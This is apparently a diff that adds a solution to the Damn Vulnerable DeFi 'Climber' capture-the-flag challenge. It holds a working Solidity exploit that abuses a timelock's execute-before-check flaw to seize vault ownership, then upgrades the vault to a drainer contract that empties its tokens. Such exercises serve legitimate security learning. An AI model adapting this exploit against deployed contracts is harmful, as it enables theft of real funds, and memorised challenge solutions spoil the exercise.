@@ -7,6 +7,12 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
+import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +91,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Attack attacker = new Attack(proposer, vault, timelock, token, recovery);
+        attacker.attack();
     }
 
     /**
@@ -95,4 +102,78 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Attack {
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+
+    address proposer;
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    DamnValuableToken token;
+    address recovery;
+
+    constructor(address _proposer, ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery) {
+        proposer = _proposer;
+        vault = _vault;
+        timelock = _timelock;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // ClimberTimelock.execute() executes an operation before it checks if the operation was scheduled or not
+        uint n = 4;
+        targets = new address[](n);
+        values = new uint256[](n);
+        dataElements = new bytes[](n);
+
+        // Grant this contract ownership of the vault so that we can upgrade it with a drainer later
+        targets[0] = address(vault);
+        values[0] = 0;
+        dataElements[0] = abi.encodeCall(OwnableUpgradeable.transferOwnership, (address(this)));
+
+        // Allow the timelock to schedule events for itself
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));
+
+        // Set readyAtTimestamp to now so we don't run into NotReadyForExecution
+        targets[2] = address(timelock);
+        values[2] = 0;
+        dataElements[2] = abi.encodeCall(ClimberTimelock.updateDelay, (0));
+
+        // "Schedule" this execute via a helper. This has to be a separate method because dataElements[3] isn't finalized
+        targets[3] = address(this);
+        values[3] = 0;
+        dataElements[3] = abi.encodeCall(this._schedule, ());
+
+        timelock.execute(targets, values, dataElements, "");
+
+        // Upgrade the vault with our drainer and transfer everything to the recovery address
+        Drainer drainer = new Drainer();
+        vault.upgradeToAndCall(address(drainer), abi.encodeCall(Drainer.drain, (token, recovery)));
+    }
+
+    function _schedule() external {
+        // When I call abi.encodeCall(ClimberTimelock.schedule, ( ... )) directly (and grant the timelock instead of 
+        // this contract the proposal role), the test debug shows different values for dataElements[3] passed into 
+        // schedule and execute. In execute, I got the bytecode for the call, but in schedule, I got 0x, so the 
+        // calculated id of the scheduled operation was different than the operation I actually executed
+        timelock.schedule(targets, values, dataElements, "");
+    }
+}
+
+contract Drainer is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    constructor() {
+        _disableInitializers();
+    }
+
+    function drain(ERC20 token, address receiver) external {
+        SafeTransferLib.safeTransfer(address(token), receiver, token.balanceOf(address(this)));
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
 }
